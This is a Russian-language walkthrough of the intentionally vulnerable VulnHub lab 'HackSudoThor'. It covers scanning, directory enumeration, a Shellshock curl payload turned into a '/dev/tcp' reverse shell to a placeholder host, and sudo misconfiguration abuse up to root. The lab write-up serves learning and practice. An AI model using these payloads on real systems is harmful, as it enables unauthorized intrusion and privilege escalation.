Сначало как обычно, проводим сканирование с помощью nmap.

```bash
nmap -sV -sC -Pn -p- 192.168.0.187
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-20 10:57 EEST
Nmap scan report for 192.168.0.187
Host is up (0.00018s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:60:3e:26:ae:23:3f:e1:8b:5d:18:e7:a7:c7:ce (RSA)
|   256 34:9a:57:60:7d:66:70:d5:b5:ff:47:96:e0:36:23:75 (ECDSA)
|_  256 ae:7d:ee:fe:1d:bc:99:4d:54:45:3d:61:16:f8:6c:87 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.30 seconds
```

Стандартный набор 22 и 80 порты.

Перейдя поссылке найдем что то типо банковского веб-приложения:

![babking page](image.png)

Попытки использовать дефолтные креды для входа на админку ничего не дали, поэтому смотрю subdirectory

```bash
gobuster dir -u http://thor.vulnhub/ -w ../../SecLists-master/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://thor.vulnhub/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../../SecLists-master/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/cgi-bin/             (Status: 403) [Size: 277]
/fonts                (Status: 301) [Size: 312] [--> http://thor.vulnhub/fonts/]
/images               (Status: 301) [Size: 313] [--> http://thor.vulnhub/images/]
/index.php            (Status: 200) [Size: 5357]
/server-status        (Status: 403) [Size: 277]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================
```

Первый скан ничего не дал, но с опыта скажу, что лучше использовать несколько разных сканов с разными словарями, потому что не всегда моэно что то получить с первого же сканирования.

```bash
gobuster dir -u http://thor.vulnhub/ -w ../../SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://thor.vulnhub/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ../../SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 313] [--> http://thor.vulnhub/images/]
/index.php            (Status: 200) [Size: 5357]
/contact.php          (Status: 200) [Size: 4164]
/home.php             (Status: 200) [Size: 5345]
/news.php             (Status: 200) [Size: 8062]
/header.php           (Status: 200) [Size: 472]
/connect.php          (Status: 200) [Size: 0]
/navbar.php           (Status: 200) [Size: 1515]
/fonts                (Status: 301) [Size: 312] [--> http://thor.vulnhub/fonts/]
/transactions.php     (Status: 302) [Size: 8163] [--> home.php]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/customer_profile.php (Status: 302) [Size: 7274] [--> home.php]
Progress: 882236 / 882240 (100.00%)
===============================================================
Finished
===============================================================
```

Тут уже большо но все так же ничего полезного для меня.

Я знаю еще два инструмента для подобного сканирования -- один из них это dirb. Попробую с помощью него:

```bash
dirb http://thor.vulnhub/ SecLists-master/Discovery/Web-Content/common.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Sep 20 11:12:40 2025
URL_BASE: http://thor.vulnhub/
WORDLIST_FILES: SecLists-master/Discovery/Web-Content/common.txt

-----------------

GENERATED WORDS: 4745                                                          

---- Scanning URL: http://thor.vulnhub/ ----
+ http://thor.vulnhub/cgi-bin/ (CODE:403|SIZE:277)                                           
==> DIRECTORY: http://thor.vulnhub/fonts/                                                    
==> DIRECTORY: http://thor.vulnhub/images/                                                   
+ http://thor.vulnhub/index.php (CODE:200|SIZE:5357)                                         
+ http://thor.vulnhub/server-status (CODE:403|SIZE:277)                                      
                                                                                             
---- Entering directory: http://thor.vulnhub/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                             
---- Entering directory: http://thor.vulnhub/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
```

И тут я увидел cgi-bin это известная входная точка для выполнения rce на сервере:

```bash
dirb http://thor.vulnhub/cgi-bin/ -X .sh

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Sep 20 11:13:22 2025
URL_BASE: http://thor.vulnhub/cgi-bin/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.sh) | (.sh) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://thor.vulnhub/cgi-bin/ ----
+ http://thor.vulnhub/cgi-bin/shell.sh (CODE:500|SIZE:610)                                   
                                                                                             
-----------------
END_TIME: Sat Sep 20 11:13:24 2025
DOWNLOADED: 4612 - FOUND: 1
```

Есть shell.sh при первом же гугле, я нахожу уязвимость:

```text
Web Server /cgi-bin Shell Access
high Nessus Plugin ID 10252
Information
Dependencies
Dependents
Changelog
Synopsis
Arbitrary commands can be run on the remote server.
Description
The remote web server has one of these shells installed in /cgi-bin :
ash, bash, csh, ksh, sh, tcsh, zsh

Leaving executable shells in the cgi-bin directory of a web server may allow an attacker to execute arbitrary commands on the target machine with the privileges of the HTTP daemon.
Solution
Remove all the shells from /cgi-bin.
```

И так же я нахожу этот експлойт: https://github.com/opsxcq/exploit-CVE-2014-6271

С него я достаю:

```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://localhost:8080/cgi-bin/vulnerable
```

вот эта команда поможет мне выполнить rce на сервере, я ее немного модифицирую:

```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'sh -i >& /dev/tcp/<HOST_IP>/4444 0>&1'" \<TARGET_IP>/cgi-bin/shell.sh
```

Выполнив эту команду я получу shell:

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.0.187 36068
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Далее мне нужно получить юзера:

```bash
sudo -l
Matching Defaults entries for www-data on HackSudoThor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on HackSudoThor:
    (thor) NOPASSWD: /home/thor/./hammer.sh
```
Мы можем выполнять этот скрипт от имени юзера thor, что именно в скрипте я не могу увилеть, так как у меня нет прав, поэтому я его просто запускаю.

```bash
sudo -u thor /home/thor/hammer.sh

HELLO want to talk to Thor?

Enter Thor  Secret Key : id
id
Hey Dear ! I am id , Please enter your Secret massage : id
id
uid=1001(thor) gid=1001(thor) groups=1001(thor)
Thank you for your precious time!
```

Путем проб и ошибок я обнаруживаю, что скрипт позволяет выполнять комынды от имени thor юзера.
Ну и дальше легко получаем шелл от имени thor юзера:

```bash
sudo -u thor /home/thor/hammer.sh

HELLO want to talk to Thor?

Enter Thor  Secret Key : test
test
Hey Dear ! I am test , Please enter your Secret massage : /bin/sh
/bin/sh
id
id
uid=1001(thor) gid=1001(thor) groups=1001(thor)
```

Далее немного колдуем над самим shellчто бы мочь хоть как то его использовать. как именно, у меня есть инструкция в notes/

```bash
thor@HacksudoThor:/usr/lib/cgi-bin$ cd /home/thor
cd /home/thor
thor@HacksudoThor:~$ ls
ls
file  file.sh  hack.tar  hammer.sh  id_rsa  ll  tar  user.txt
thor@HacksudoThor:~$ cat user.txt
cat user.txt
user owned
```

Юзера мы получили, теперь нужно получить рута:

```bash
sudo -l
Matching Defaults entries for thor on HackSudoThor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User thor may run the following commands on HackSudoThor:
    (root) NOPASSWD: /usr/bin/cat, /usr/sbin/service
thor@HacksudoThor:~$ sudo service ../../bin/sh
sudo service ../../bin/sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Вот так легко.
